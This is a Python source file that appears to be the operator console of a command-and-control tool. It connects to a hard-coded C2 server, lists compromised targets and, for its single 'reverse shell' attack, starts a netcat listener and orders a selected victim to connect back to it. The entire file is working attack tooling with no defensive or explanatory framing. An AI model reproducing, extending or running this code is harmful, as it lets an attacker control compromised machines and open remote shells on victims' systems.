#/usr/bin env python3
import socket,os
from cmd import Cmd
from time import sleep


class C2cmd(Cmd):
    def __init__(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect(("192.168.1.134",7000))
        super().__init__()
        self.prompt = "(c&c) "
        self.target = ""
        self.attack = ""

    def do_exit(self,args): 
        return True
    def help_exit(self):
        print("Close the Command & Control shell.")

    def do_list(self,args):
        self.s.send(b'l')
        print("CONNECTIONS")
        i = 0
        string = "["+str(i)+"] " 
        while True:
            data = self.s.recv(1024)
            if data == b'q' or data == b'':
                break
            data = data.decode("utf-8")
            if len(data) > 5:
                string = string+data+":"
            else:
                string = string+data
                i += 1
                print(string)
                string = "["+str(i)+"] " 
    def help_list(self):
        print("Show the targets list")

    def do_select(self,args):
        args = args.split()
        if len(args) == 2:
            self.target = args[0]
            self.attack = args[1]
        else:
            self.help_select()
    def help_select(self):
        print("Select a target.")
        print("SYNTAX")
        print("\tselect [TARGET ID] [ATTACK ID]")

    def do_attacks(self,args):
        print("ATTACKS")
        print("[0] Reverse shell")

    def do_run(self,args):
        if self.attack == "0":
            os.system('xterm -e "nc -lvnp 9000" &')
        self.s.send(b'c')
        sleep(0.1)
        self.s.send(self.target.encode("utf-8")+self.attack.encode("utf-8"))

if __name__ == "__main__":
    shell = C2cmd()
    shell.cmdloop()
